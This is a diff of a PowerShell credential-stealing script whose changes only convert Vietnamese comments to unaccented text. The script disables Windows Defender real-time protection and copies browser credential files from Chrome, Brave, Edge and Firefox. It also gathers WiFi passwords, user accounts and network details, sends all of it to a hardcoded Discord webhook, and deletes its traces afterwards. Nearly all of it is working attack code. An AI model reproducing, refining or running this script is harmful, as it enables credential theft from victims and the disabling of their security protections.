@@ -2,23 +2,23 @@
 
 $WEBHOOK_URL = 'https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj'
 
-# Thư mục tạm trên máy nạn nhân
+# Thu muc tam tren may nan nhan
 $destDir = "$env:TEMP\Exfil_$env:USERNAME"
 if (-Not (Test-Path $destDir)) {
     New-Item -ItemType Directory -Path $destDir -Force
 }
 
-# Tạo thư mục con
+# Tao thu muc con
 $sysInfoDir = "$destDir\SystemInfo"
 New-Item -ItemType Directory -Path $sysInfoDir -Force
 
-# Tắt Windows Defender
+# Tat Windows Defender
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 } catch {}
 
 # ==========================================
-# DISCORD WEBHOOK FUNCTION - GỬI TEXT
+# DISCORD WEBHOOK FUNCTION - GUI TEXT
 # ==========================================
 function Send-DiscordText {
     param([string]$Title, [string]$Content)
@@ -28,13 +28,13 @@ function Send-DiscordText {
         return
     }
     
-    # Discord giới hạn 2000 ký tự mỗi message
+    # Discord gioi han 2000 ky tu moi message
     if ($Content.Length -gt 1900) {
         $Content = $Content.Substring(0, 1900) + "...`n[TRUNCATED]"
     }
     
     $payload = @{
-        content = "**📌 $Title**`n```$Content```"
+        content = "**[$Title]**`n```$Content```"
     } | ConvertTo-Json
     
     try {
@@ -45,7 +45,7 @@ function Send-DiscordText {
     }
 }
 
-# Hàm gửi nhiều phần (nếu nội dung dài)
+# Ham gui nhieu phan (neu noi dung dai)
 function Send-DiscordLongText {
     param([string]$Title, [string]$Content, [int]$MaxLength = 1900)
     
@@ -56,7 +56,7 @@ function Send-DiscordLongText {
         return
     }
     
-    # Chia nhỏ nội dung
+    # Chia nho noi dung
     $parts = [math]::Ceiling($Content.Length / $MaxLength)
     for ($i = 0; $i -lt $parts; $i++) {
         $start = $i * $MaxLength
@@ -98,7 +98,7 @@ function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
     }
 }
 
-# Hàm đọc file và trả về nội dung (xử lý file nhị phân)
+# Ham doc file va tra ve noi dung (xu ly file nhi phan)
 function Get-FileContentAsText {
     param([string]$FilePath)
     
@@ -106,7 +106,7 @@ function Get-FileContentAsText {
     
     try {
         $bytes = [System.IO.File]::ReadAllBytes($FilePath)
-        # Chỉ lấy 5000 bytes đầu để tránh quá dài
+        # Chi lay 5000 bytes dau de tranh qua dai
         if ($bytes.Length -gt 5000) {
             $bytes = $bytes[0..4999]
             $isTruncated = $true
@@ -201,14 +201,14 @@ foreach ($profile in $wifiProfiles) {
 }
 
 # ==========================================
-# 7. GỬI DỮ LIỆU QUA DISCORD (DẠNG TEXT)
+# 7. GUI DU LIEU QUA DISCORD (DANG TEXT)
 # ==========================================
 Write-Host "[+] Sending data to Discord..."
 
-# Gửi thông báo bắt đầu
+# Gui thong bao bat dau
 Send-DiscordText "TARGET INFORMATION" "Computer: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date)"
 
-# Gửi WiFi passwords
+# Gui WiFi passwords
 $wifiContent = Get-Content $wifiFile -Raw -ErrorAction SilentlyContinue
 if ($wifiContent) {
     Send-DiscordLongText "WiFi Passwords" $wifiContent
@@ -216,29 +216,29 @@ if ($wifiContent) {
     Send-DiscordText "WiFi Passwords" "No WiFi profiles found"
 }
 
-# Gửi Computer Info
+# Gui Computer Info
 $computerInfo = Get-Content "$sysInfoDir\computer_info.txt" -Raw -ErrorAction SilentlyContinue
 if ($computerInfo) {
     Send-DiscordLongText "Computer Information" $computerInfo
 }
 
-# Gửi Local Users
+# Gui Local Users
 $localUsers = Get-Content "$sysInfoDir\local_users.txt" -Raw -ErrorAction SilentlyContinue
 if ($localUsers) {
     Send-DiscordLongText "Local Users" $localUsers
 }
 
-# Gửi Network Config
+# Gui Network Config
 $networkConfig = Get-Content "$sysInfoDir\network_config.txt" -Raw -ErrorAction SilentlyContinue
 if ($networkConfig) {
     Send-DiscordLongText "Network Configuration" $networkConfig
 }
 
-# Gửi Process List (tóm tắt)
+# Gui Process List (tom tat)
 $processes = Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 30 | Out-String
 Send-DiscordText "Top 30 Processes by CPU" $processes
 
-# Gửi browser credentials
+# Gui browser credentials
 $browsers = @("Chrome", "Brave", "Edge", "Firefox")
 foreach ($browser in $browsers) {
     $browserDir = "$destDir\$browser"
@@ -270,11 +270,11 @@ foreach ($browser in $browsers) {
     }
 }
 
-# Gửi thông báo hoàn tất
+# Gui thong bao hoan tat
 Send-DiscordText "EXFILTRATION COMPLETED" "Target: $env:COMPUTERNAME`nUser: $env:USERNAME`nCompleted: $(Get-Date)"
 
 # ==========================================
-# 8. DỌN DẸP
+# 8. DON DEP
 # ==========================================
 Write-Host "[+] Cleaning up..."
 Remove-Item $destDir -Recurse -Force -ErrorAction SilentlyContinue
